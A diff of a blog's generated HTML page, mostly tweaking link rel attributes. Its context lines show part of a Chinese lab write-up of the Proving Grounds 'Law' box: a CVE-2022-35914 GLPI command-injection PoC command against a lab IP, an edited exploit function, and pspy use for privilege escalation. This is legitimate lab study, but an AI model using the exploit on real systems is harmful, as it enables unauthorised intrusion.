@@ -163,9 +163,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -207,7 +205,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Yiaos">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content>
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -272,7 +270,7 @@
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=MTg5MGY2OGEyMzZkMTM1M2I5OWQxZDA2ZGY2ODBlOWJfb3dmRXNGd2hZVkwzM21EOGozUVRXWUpnMlZmZXF2YlpfVG9rZW46UHI2dWJuOXZ2b3pOM0V4Y3YydmNvOE5sblNoXzE3Mzk3MTAyMzA6MTczOTcxMzgzMF9WNA"></p>
 <h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=NTc1Nzg5ODMxNTA5ODQzZjI0Y2ZiZmJhZDNhMjBhMThfQ1JzNk1GUFF0UFlvUEF0dFdFdUZqaFhNNENpM0xVUDVfVG9rZW46TDBxcWJXVHNrb2ZFRDh4ZUJBd2NmSXlwbkxSXzE3Mzk3MTAyMzA6MTczOTcxMzgzMF9WNA"></p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py">https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py">https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py</a></p>
 </blockquote>
 <p>执行 <code>python cve-2022-35914.py -u ``http://192.168.212.190`` -c &quot;id&quot;</code> 后提示失败，查看代码修改默认uri为 <code>/index.php</code>,重新执行</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">url,cmd,user_agent,check,hook</span>):</span><br><span class="line">    <span class="comment"># uri = &quot;/vendor/htmlawed/htmlawed/htmLawedTest.php&quot;</span></span><br><span class="line">    uri = <span class="string">&quot;/index.php&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: user_agent&#125;</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    response_part1 = session.get(<span class="built_in">str</span>(url)+uri, verify=<span class="literal">False</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(response_part1.text)</span><br><span class="line">    <span class="keyword">if</span> (response_part1.status_code != <span class="number">200</span>):</span><br><span class="line">        fail()</span><br></pre></td></tr></table></figure>
@@ -296,7 +294,7 @@
 
 <p>试了sudo 提权，没有成功，其他也没有头绪，先用pspy检查一下有没有其他定时任务</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy?tab=readme-ov-file">https://github.com/DominicBreuker/pspy?tab=readme-ov-file</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/DominicBreuker/pspy?tab=readme-ov-file">https://github.com/DominicBreuker/pspy?tab=readme-ov-file</a></p>
 </blockquote>
 <p>pspy可以在不需要root权限的情况下监控进程执行情况，尤其适用于检查进程执行时间短，使用ps -ef等命令无法查看到的场景。</p>
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=YWM0OGYxMmNjZjRkYjNlMjNlMjJmOGNiMDFhODE1NDZfSEtkZXc0NHoweG1ibVhRRUR6Umo3eFRoaGtRMkFGM1RfVG9rZW46TVNXa2JhUTNWb05MNXl4ZzhsVGNTYXJobnFoXzE3Mzk3MTAyMzA6MTczOTcxMzgzMF9WNA"></p>
@@ -327,7 +325,7 @@
     <a href="https://thiiiiink.com/post/20250216205050.html" title="Proving Grounds Practice - Law">https://thiiiiink.com/post/20250216205050.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
   </li>
 </ul>
 </div>
@@ -423,11 +421,11 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
   </div>
   <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
   </div>
 
 
